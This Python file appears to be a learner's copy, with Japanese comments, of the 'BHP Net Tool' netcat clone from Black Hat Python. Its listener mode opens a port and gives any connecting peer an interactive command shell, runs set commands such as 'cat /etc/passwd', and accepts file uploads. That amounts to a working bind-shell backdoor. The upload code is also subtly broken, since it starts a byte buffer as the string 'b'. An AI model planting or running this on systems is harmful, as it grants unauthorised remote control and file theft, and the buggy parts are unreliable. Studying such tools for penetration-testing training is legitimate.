import argparse
from email import message
import locale
import os
import socket
import  shlex
import subprocess
import sys
import textwrap
import threading
from urllib import response

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    # os.name = "nt"はWindowsかどうかの判断。Windows上で実行する場合、shellをTrueにすることでDirとかのコマンドが使える
    if os.name == "nt":
        shell = True
    else:
        shell = False
    # ローカルでコマンド実行しそのコマンドからの出力を返す
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT,shell=shell)
    # 日本語Windowsで実行されているかの判断
    if locale.getdefaultlocale() == ('ja_JP', 'cp932'):
        return output.decode('cp932')
    else:
        return output.decode()

class NetCat:
    # コマンドラインの引数とバッファでNetCatオブジェクトを初期化
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        # ソケットオブジェクトの作成
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            # リスナーの設定
            self.listen()
        else:
            # それ以外
            self.send()
    def send(self):
        # 指定のIPアドレスとポート番号に接続
        self.socket.connect((self.args.target, self.args.port))
        # バッファがあればまずそれを送る
        if self.buffer:
            self.socket.send(self.buffer)
        # Ctrl + Cで手動で接続を閉じられるようにするためのtry/catchブロック
        try:
            # 標的からデータを受け取るための繰り返し処理を開始
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # 受け取るデータがなければ処理を抜ける
                    if recv_len < 4096:
                        break
                # 受けとったデータを出力し対話的に入力を得るために一時停止しその入力を送信して繰り返し処理を実行
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        # Ctrl + Cが押されたときの処理
        except KeyboardInterrupt:
            print('Use terminated')
            self.socket.close()
            sys.exit()
        except EOFError as e:
            print(e)
    
    def listen(self):
        # 指定されたIPアドレスとポート番号にバインド
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        # 待ち受けを開始し接続されたソケットをhandleメソッドに渡す
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle,args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        # コマンド実行すべき場合、execute関数にコマンドを渡しその出力をソケットに返す
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        # ファイルをアップロードする場合、ソケットでファイルデータを受け取る繰り返し処理を開始しデータを受信し続ける間はずっと受け取る
        # 受信したデータを指定されたファイルを書き込む
        elif self.args.upload:
            file_buffer = 'b'
            while True:
                data= client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        # シェルを起動する場合は繰り返し処理を開始し接続元にプロンプトを表示しコマンド文字列を受け取るのを待つ
        # execute関数を使ってコマンドを実行しコマンドの実行結果を接続元に返す
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'<BHP:#> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())

                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    #　標準ライブラリからargparseを呼び出しコマンドラインインタフェースを作成
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # 使用例の作成
        epilog=textwrap.dedent(
            '''実行例:
            # 対話型コマンドシェル起動
            netcat.py -t 192.168.1.108 -p 5555 -c
            # ファイルのアップロード
            netcat.py -t 192.168.1.108 -p 5555 -c -l -u=mytest.txt
            # コマンドの実行
            netcat.py -t 192.168.1.108 -p 5555 -c -l -e=\"cat /etc/passwd\"
            # 通信先サーバの135番ポートに文字列を送信
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
            # サーバに接続
            netcat.py -t 192.168.1.108 -p 5555
        ''')
    )
    # 6つの引数を作成
    parser.add_argument('-c', '--command', action='store_true',help='対話型シェルの初期化')
    parser.add_argument('-e', '--execute',help='指定コマンドの実行')
    parser.add_argument('-l', '--listen', action='store_true',help='通信待受モード')
    parser.add_argument('-p', '--port', type=int,default=5555,help='ポート番号の指定')
    parser.add_argument('-t', '--target', default='192.168.1.203',help='IPアドレスの指定')
    parser.add_argument('-u', '--upload', help='ファイルのアップロード')
    # リスナーとして設定している場合空のバッファ文字列でNetCatオブジェクトを起動する
    # それ以外はstdinからバッファの内容を送ってからNetCatを起動する
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()